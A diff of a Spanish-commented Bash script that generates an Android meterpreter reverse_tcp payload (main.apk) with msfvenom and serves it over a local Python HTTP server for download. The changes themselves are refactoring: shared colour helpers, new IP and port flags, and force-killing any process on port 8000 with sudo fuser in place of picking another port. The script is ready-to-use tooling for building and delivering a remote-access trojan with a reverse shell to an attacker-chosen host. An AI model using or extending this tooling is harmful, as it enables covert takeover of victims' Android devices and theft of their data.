@@ -1,24 +1,11 @@
 #!/bin/bash
 
-# Definir colores
-GREEN="\e[32m"
-RED="\e[31m"
-RESET="\e[0m"
+source ./utilities/utils.sh
 
 # Función para mostrar el uso del script
 usage() {
-    echo "Uso: $0 [-ip <IP_ADDRESS>] [-port <PORT>] [-dns <DNS_NAME>]"
+    echo "Uso: $0 [-ip <IP_ADDRESS>] [-port <PORT>]"
     exit 1
-}
-
-# Función para mostrar mensajes en verde
-print_green() {
-    echo -e "${GREEN}$1${RESET}"
-}
-
-# Función para mostrar mensajes en rojo
-print_red() {
-    echo -e "${RED}$1${RESET}"
 }
 
 # Inicializar las variables
@@ -28,11 +15,11 @@ PORT=""
 # Procesar las opciones de línea de comandos
 while [[ $# -gt 0 ]]; do
     case "$1" in
-        -ip)
+        -i|--ip)
             LOCAL_IP="$2"
             shift 2
             ;;
-        -port)
+        --p|--port)
             PORT="$2"
             shift 2
             ;;
@@ -82,7 +69,7 @@ if [ -f main.apk ]; then
 fi
 
 echo "Generando payload..."
-# Generar el payload de Android con msfvenom
+# Generar el payload de Android con msfvenom, en ../main.apk
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$PORT -o main.apk
 if [ $? -eq 0 ]; then
     print_green "Payload generado exitosamente: main.apk, LHOST=$LOCAL_IP, LPORT=$PORT"
@@ -104,18 +91,13 @@ fi
 
 PORT_PYTHON=8000
 # Nos aseguramos que el puerto 8000 no esté en uso, si lo esta utilizamos otro
-if nc -z 127.0.0.1 1 &> /dev/null; then
+if nc -z 127.0.0.1 $PORT_PYTHON &> /dev/null; then
     # Nos aseguramos que el puerto 8000 no esté en uso, si lo esta utilizamos otro
-    while nc -z localhost $PORT_PYTHON; do
-        print_red "El puerto $PORT_PYTHON está en uso. Utilizando otro puerto..."
-        PORT_PYTHON=$((PORT_PYTHON + 1))
-    done
-else
-    # Nos aseguramos que el puerto 8000 no esté en uso, si lo esta utilizamos otro
-    while ss -tuln | grep -q ":$PORT_PYTHON "; do
-        print_red "El puerto 8000 está en uso. Utilizando otro puerto..."
-        PORT_PYTHON=$((PORT_PYTHON + 1))
-    done
+    print_red "El puerto $PORT_PYTHON está en uso. Cerrándolo..."
+    sudo fuser -k $PORT_PYTHON/tcp &>/dev/null
+elif ss -tuln | grep -q ":$PORT_PYTHON "; then
+    print_red "El puerto $PORT_PYTHON está en uso. Cerrándolo..."
+    sudo fuser -k $PORT_PYTHON/tcp &>/dev/null
 fi
 
 # Creamos un servidor HTTP para descargar el APK con Python 3
